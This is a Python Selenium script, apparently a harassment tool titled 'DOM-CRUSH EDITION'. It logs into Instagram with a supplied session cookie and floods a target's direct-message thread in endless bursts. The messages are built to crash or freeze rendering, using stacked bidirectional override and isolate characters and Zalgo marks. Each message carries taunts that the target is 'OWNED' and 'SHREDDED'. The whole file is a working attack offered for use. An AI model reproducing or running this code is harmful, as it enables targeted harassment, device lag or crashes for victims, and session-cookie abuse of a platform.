# -*- coding: utf-8 -*-
# 🚀 PROJECT: PRAVEER NC (DOM-CRUSH EDITION)
# 📅 STATUS: ISOLATE LAYERING | BURST MODE | 10 AGENTS

import os, time, random, threading, sys, gc, tempfile, shutil
from concurrent.futures import ThreadPoolExecutor
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.chrome.options import Options

# --- CONFIG ---
THREADS = 2
SESSION_LIMIT = 150 
MACHINE_ID = os.getenv("MACHINE_ID", "1")

def get_dom_crush_payload(target_name):
    """Generates the high-intensity Isolate Layering payload."""
    header = "👑 PRAVEER PAPA 👑\n"
    sub_header = f"SYSTEM ERROR: [{target_name.upper()}] OWNED\n"
    
    # 💥 THE 'LAYOUT KILLER' (Mismatched Isolate Overrides)
    # Forces the browser to calculate nested direction layers
    chaos = "\u202E\u202D\u2066\u2067" * 45 
    
    # 💥 THE 'RENDER STACK' (Triple-Type Zalgo)
    zalgo_stack = "̸" * 30 + "̰" * 30 + "̵" * 30
    
    # 💥 THE 'FREEZER' (Mismatched tags)
    freezer = "\u2068" * 80 + "\u2069" * 80 
    
    lines = [header, sub_header, freezer]
    for i in range(40):
        pattern = chaos if i % 2 == 0 else chaos[::-1]
        lines.append(f"{pattern} {target_name.upper()}_SHREDDED {zalgo_stack}")
    
    payload = "\n".join(lines)
    return payload[:9500] 

def get_driver(agent_id):
    chrome_options = Options()
    chrome_options.add_argument("--headless=new")
    chrome_options.add_argument("--no-sandbox")
    chrome_options.add_argument("--disable-dev-shm-usage")
    chrome_options.add_argument("--window-size=1920,1080")
    chrome_options.add_argument("user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36")
    return webdriver.Chrome(options=chrome_options)

def run_life_cycle(agent_id, cookie, target_id, target_name):
    while True:
        driver = None
        session_start = time.time()
        try:
            print(f"[M{MACHINE_ID}-A{agent_id}] 🚀 DEPLOYING DOM-CRUSH AGENT...")
            driver = get_driver(agent_id)
            driver.get("https://www.instagram.com/")
            driver.add_cookie({'name': 'sessionid', 'value': cookie, 'path': '/', 'domain': '.instagram.com'})
            driver.refresh()
            time.sleep(5)
            driver.get(f"https://www.instagram.com/direct/t/{target_id}/")
            time.sleep(10)

            while (time.time() - session_start) < SESSION_LIMIT:
                try:
                    box = driver.find_element(By.XPATH, "//div[@role='textbox'] | //textarea")
                    
                    # 🔥 BURST MODE: Send 5 in a row to create a "Lag Spike"
                    for _ in range(5):
                        payload = get_dom_crush_payload(target_name)
                        driver.execute_script("""
                            var el = arguments[0];
                            document.execCommand('insertText', false, arguments[1]);
                            el.dispatchEvent(new Event('input', { bubbles: true }));
                        """, box, payload)
                        box.send_keys(Keys.ENTER)
                        time.sleep(0.1) 
                    
                    print(f"[M{MACHINE_ID}-A{agent_id}] 💥 BURST DELIVERED | {target_name.upper()} CRUSHED")
                    
                    # COOL-DOWN: Wait for server to breath before next spike
                    time.sleep(random.uniform(8, 12)) 
                    
                except Exception as e:
                    time.sleep(5)
                    break 
        except Exception: pass
        finally:
            if driver: driver.quit()
            gc.collect()
            time.sleep(3)

def main():
    cookie = os.environ.get("SESSION_ID", "").strip()
    target_id = os.environ.get("GROUP_URL", "").strip()
    target_name = os.environ.get("TARGET_NAME", "Target").strip()
    if not cookie or not target_id: sys.exit(1)
    
    with ThreadPoolExecutor(max_workers=THREADS) as executor:
        for i in range(THREADS):
            executor.submit(run_life_cycle, i+1, cookie, target_id, target_name)

if __name__ == "__main__":
    main()
